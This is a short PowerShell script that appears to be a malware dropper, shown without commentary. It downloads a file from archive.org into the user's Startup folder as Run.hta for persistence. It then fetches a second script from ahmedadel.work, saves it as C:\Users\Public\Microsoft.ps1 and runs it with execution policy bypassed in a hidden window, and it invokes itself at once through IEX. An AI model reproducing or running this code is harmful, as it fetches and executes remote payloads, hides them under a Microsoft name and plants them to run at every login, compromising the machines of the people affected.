Function HBar0
{
$p = 'C:\Users\' + $env:UserName + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
$ps1 = 'C:\Users\Public\'


start-sleep -s 7

if((New-Object System.Net.WebClient).DownloadFile('https://ia801503.us.archive.org/13/items/startup_20210219/Startup.txt', $p + 'Run.hta')){
}
start-sleep -s 7
if((New-Object System.Net.WebClient).DownloadFile('http://ahmedadel.work/cairo/Server.txt' , $ps1 + 'Microsoft.ps1')){
}
start-sleep -s 7
powershell -windo 1 -noexit -exec bypass -file "C:\Users\Public\Microsoft.ps1"
}
IEX HBar0